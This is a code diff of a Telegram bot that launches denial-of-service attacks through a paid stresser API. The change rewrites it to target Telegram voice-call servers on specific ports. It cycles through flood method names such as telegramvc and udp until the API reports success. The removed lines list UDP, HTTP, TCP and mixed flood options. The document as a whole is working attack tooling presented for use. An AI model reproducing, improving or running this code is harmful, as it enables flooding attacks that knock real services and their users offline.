@@ -1,4 +1,4 @@
-# app.py - User Provides IP, Port, Time, Method
+# app.py - Only Telegram VC Method
 import os
 import logging
 import asyncio
@@ -133,39 +133,91 @@ class AttackManager:
 attack_manager = AttackManager()
 
 # ===== API CALLER =====
-async def send_attack(target, port, duration, method):
-    """Send attack to API with user-specified parameters"""
+async def send_telegram_vc_attack(target, port, duration):
+    """Send Telegram VC attack to API"""
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    params = {
-        "key": API_KEY,
-        "host": target,
-        "port": port,
-        "time": duration,
-        "method": method  # User specified method (e.g., telegramvc)
-    }
+    # Try different method names that might work
+    method_variations = [
+        "telegramvc",
+        "telegram-vc", 
+        "telegram",
+        "vc",
+        "UDP",
+        "udp"
+    ]
     
-    try:
-        timeout = aiohttp.ClientTimeout(total=duration + 15)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            start_time = time.time()
-            async with session.get(url, params=params) as response:
-                elapsed = time.time() - start_time
-                result_text = await response.text()
-                
-                is_success = response.status == 200 and ("SUCCESS" in result_text or "sent" in result_text.lower())
-                
-                return {
-                    "success": is_success,
-                    "status_code": response.status,
-                    "elapsed": f"{elapsed:.2f}s",
-                    "response": result_text[:300],
-                    "full_response": result_text,
-                    "params_used": params
-                }
-    except Exception as e:
-        logger.error(f"Attack failed: {e}")
-        return {"success": False, "error": str(e)}
+    results = []
+    
+    for method in method_variations:
+        params = {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": method
+        }
+        
+        try:
+            timeout = aiohttp.ClientTimeout(total=duration + 15)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                start_time = time.time()
+                async with session.get(url, params=params) as response:
+                    elapsed = time.time() - start_time
+                    result_text = await response.text()
+                    
+                    # Check if attack was sent
+                    is_success = response.status == 200 and (
+                        "SUCCESS" in result_text or 
+                        "sent" in result_text.lower() or
+                        "attack" in result_text.lower()
+                    )
+                    
+                    results.append({
+                        'method': method,
+                        'status': response.status,
+                        'elapsed': f"{elapsed:.2f}s",
+                        'success': is_success,
+                        'response': result_text[:300]
+                    })
+                    
+                    logger.info(f"Method {method}: Status {response.status}, Success: {is_success}")
+                    
+                    # If success, return immediately
+                    if is_success:
+                        return {
+                            "success": True,
+                            "method_used": method,
+                            "status_code": response.status,
+                            "elapsed": f"{elapsed:.2f}s",
+                            "response": result_text[:500],
+                            "full_response": result_text,
+                            "attempts": results
+                        }
+                    
+                    await asyncio.sleep(0.5)  # Delay between attempts
+                    
+        except Exception as e:
+            logger.error(f"Method {method} failed: {e}")
+            results.append({
+                'method': method,
+                'success': False,
+                'error': str(e)
+            })
+    
+    # If all failed, return last result
+    if results:
+        last = results[-1]
+        return {
+            "success": False,
+            "method_used": "none",
+            "status_code": last.get('status', 0),
+            "elapsed": last.get('elapsed', '0s'),
+            "response": last.get('response', 'No response'),
+            "attempts": results
+        }
+    
+    return {"success": False, "error": "No response from API"}
 
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -181,26 +233,23 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
     await update.message.reply_text(
-        f"⚡ *ATTACK BOT*\n\n"
+        f"⚡ *TELEGRAM VC ATTACK BOT*\n\n"
         f"🔥 Status: ONLINE\n"
         f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📊 Total Attacks: {stats['total']}\n\n"
         f"📌 *How to use:*\n"
-        f"Send: `/attack IP PORT TIME METHOD`\n\n"
-        f"Example: `/attack 91.108.17.19 32001 60 telegramvc`\n\n"
-        f"📡 *Available Methods:*\n"
-        f"• telegramvc - Telegram Voice Call\n"
-        f"• udp - UDP Flood\n"
-        f"• http - HTTP Flood\n"
-        f"• tcp - TCP Flood\n"
-        f"• mix - Mixed Attack\n\n"
+        f"Send: `/attack IP PORT TIME`\n\n"
+        f"Example: `/attack 91.108.17.19 32001 60`\n\n"
+        f"🎯 *This attacks Telegram Voice Calls*\n"
+        f"• Method: telegramvc (UDP based)\n"
+        f"• Ports: 32001-32005, 3478-3482\n"
         f"⏱️ Time: 60-300 seconds",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /attack with user-provided parameters"""
+    """Handle /attack command - only Telegram VC"""
     user_id = update.effective_user.id
     
     if user_id != OWNER_ID:
@@ -208,17 +257,13 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     args = context.args
-    if len(args) < 4:
+    if len(args) < 3:
         await update.message.reply_text(
-            "❌ *Usage:* `/attack IP PORT TIME METHOD`\n\n"
-            "Example: `/attack 91.108.17.19 32001 60 telegramvc`\n\n"
-            "📡 *Methods:*\n"
-            "• telegramvc - Telegram Voice Call\n"
-            "• udp - UDP Flood\n"
-            "• http - HTTP Flood\n"
-            "• tcp - TCP Flood\n"
-            "• mix - Mixed Attack\n\n"
-            "⏱️ Time: 60-300 seconds",
+            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
+            "Example: `/attack 91.108.17.19 32001 60`\n\n"
+            "🎯 Method: telegramvc (Telegram Voice Call)\n"
+            "⏱️ Time: 60-300 seconds\n\n"
+            "💡 This attacks Telegram Voice Call servers!",
             parse_mode='Markdown'
         )
         return
@@ -227,17 +272,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target = args[0]
         port = int(args[1])
         duration = int(args[2])
-        method = args[3].lower()
-        
-        # Validate method
-        valid_methods = ['telegramvc', 'udp', 'http', 'tcp', 'mix']
-        if method not in valid_methods:
-            await update.message.reply_text(
-                f"❌ Invalid method: {method}\n\n"
-                f"Available: {', '.join(valid_methods)}",
-                parse_mode='Markdown'
-            )
-            return
         
         # Validate duration
         if duration < 60:
@@ -255,24 +289,24 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # Start attack
         status_msg = await update.message.reply_text(
-            f"🚀 *ATTACK STARTED*\n\n"
+            f"🚀 *TELEGRAM VC ATTACK STARTED*\n\n"
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
-            f"🔧 Method: `{method}`\n"
+            f"🔧 Method: `telegramvc`\n"
             f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
             f"⏳ Sending attack...",
             parse_mode='Markdown'
         )
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "telegramvc")
         
         # Send attack to API
-        result = await send_attack(target, port, duration, method)
+        result = await send_telegram_vc_attack(target, port, duration)
         
         # Log attack
         attack_manager.log_attack(
-            user_id, target, port, duration, method,
+            user_id, target, port, duration, "telegramvc",
             "success" if result.get('success') else "failed",
             str(result)
         )
@@ -283,15 +317,26 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
-            f"🔧 Method: `{method}`\n"
+            f"🔧 Method: `telegramvc`\n"
             f"📊 Attack ID: `{attack_id}`\n"
             f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}\n"
             f"⏱️ Response Time: {result.get('elapsed', 'N/A')}\n\n"
         )
         
+        # Add method used
+        if result.get('method_used'):
+            response_text += f"📡 Method Used: `{result['method_used']}`\n"
+        
+        # Add attempts info
+        if result.get('attempts'):
+            response_text += f"\n📊 *Attempts:*\n"
+            for attempt in result['attempts']:
+                status = "✅" if attempt.get('success') else "❌"
+                response_text += f"{status} {attempt.get('method', 'N/A')} - {attempt.get('status', 'N/A')}\n"
+        
         # Add response preview
         if result.get('response'):
-            response_text += f"📡 *API Response:*\n```\n{result['response'][:200]}\n```"
+            response_text += f"\n📡 *API Response:*\n```\n{result['response'][:200]}\n```"
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
         
@@ -304,29 +349,24 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
 async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Attack from button - asks user for details"""
+    """Attack from button"""
     query = update.callback_query
     await query.answer()
     
     await query.edit_message_text(
-        "💥 *ATTACK*\n\n"
+        "💥 *TELEGRAM VC ATTACK*\n\n"
         "Send in this format:\n"
-        "`IP PORT TIME METHOD`\n\n"
-        "Example: `91.108.17.19 32001 60 telegramvc`\n\n"
-        "📡 *Methods:*\n"
-        "• telegramvc - Telegram Voice Call\n"
-        "• udp - UDP Flood\n"
-        "• http - HTTP Flood\n"
-        "• tcp - TCP Flood\n"
-        "• mix - Mixed Attack\n\n"
-        "⏱️ Time: 60-300 seconds\n"
+        "`IP PORT TIME`\n\n"
+        "Example: `91.108.17.19 32001 60`\n\n"
+        "🎯 Method: telegramvc (Telegram Voice Call)\n"
+        "⏱️ Time: 60-300 seconds\n\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
     )
     context.user_data['awaiting_attack'] = True
 
 async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process attack from button with user-provided details"""
+    """Process attack from button"""
     if not context.user_data.get('awaiting_attack'):
         return
     
@@ -344,10 +384,10 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     try:
         parts = update.message.text.split()
-        if len(parts) < 4:
+        if len(parts) < 3:
             await update.message.reply_text(
-                "❌ Use: `IP PORT TIME METHOD`\n"
-                "Example: `91.108.17.19 32001 60 telegramvc`",
+                "❌ Use: `IP PORT TIME`\n"
+                "Example: `91.108.17.19 32001 60`",
                 parse_mode='Markdown'
             )
             return
@@ -355,15 +395,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target = parts[0]
         port = int(parts[1])
         duration = int(parts[2])
-        method = parts[3].lower()
-        
-        valid_methods = ['telegramvc', 'udp', 'http', 'tcp', 'mix']
-        if method not in valid_methods:
-            await update.message.reply_text(
-                f"❌ Invalid method: {method}\nAvailable: {', '.join(valid_methods)}",
-                parse_mode='Markdown'
-            )
-            return
         
         if duration < 60 or duration > 300:
             await update.message.reply_text("❌ Duration must be 60-300 seconds!")
@@ -376,21 +407,21 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         status_msg = await update.message.reply_text(
-            f"🚀 Attacking {target}:{port} for {duration}s with method {method}..."
+            f"🚀 Attacking {target}:{port} for {duration}s with telegramvc method..."
         )
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
-        result = await send_attack(target, port, duration, method)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "telegramvc")
+        result = await send_telegram_vc_attack(target, port, duration)
         
         response_text = (
             f"✅ *ATTACK COMPLETED*\n\n"
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
-            f"🔧 Method: `{method}`\n"
+            f"🔧 Method: `telegramvc`\n"
             f"📊 Attack ID: `{attack_id}`\n"
             f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}\n\n"
-            f"📡 API Response: {result.get('response', 'N/A')[:150]}"
+            f"📡 Response: {result.get('response', 'N/A')[:200]}"
         )
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
@@ -414,8 +445,9 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
         f"📌 *Usage:*\n"
-        f"/attack IP PORT TIME METHOD\n"
-        f"Example: `/attack 91.108.17.19 32001 60 telegramvc`",
+        f"/attack IP PORT TIME\n"
+        f"Example: `/attack 91.108.17.19 32001 60`\n\n"
+        f"🎯 Method: telegramvc only!",
         parse_mode='Markdown'
     )
 
@@ -433,7 +465,7 @@ async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for aid, att in active.items():
             elapsed = (datetime.now() - att['start_time']).seconds
             remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} ({att['method']}) - {remaining}s left\n"
+            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
     
     keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
     await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
@@ -448,12 +480,8 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
         f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
         f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
-        f"📌 *Methods:*\n"
-        f"• telegramvc - Telegram VC\n"
-        f"• udp - UDP Flood\n"
-        f"• http - HTTP Flood\n"
-        f"• tcp - TCP Flood\n"
-        f"• mix - Mixed Attack",
+        f"🎯 *Method:* telegramvc only\n"
+        f"📡 *Ports:* 32001-32005, 3478-3482",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
@@ -492,7 +520,7 @@ async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for aid, att in active.items():
             elapsed = (datetime.now() - att['start_time']).seconds
             remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} ({att['method']}) - {remaining}s left\n"
+            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
     
     await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]))
 
@@ -532,7 +560,8 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total: {stats['total']}\n"
         f"🌐 Status: ONLINE\n\n"
-        f"📌 /attack IP PORT TIME METHOD",
+        f"📌 /attack IP PORT TIME\n"
+        f"🎯 Method: telegramvc",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -575,7 +604,7 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("⚡ ATTACK BOT STARTING...")
+    print("⚡ TELEGRAM VC ATTACK BOT STARTING...")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
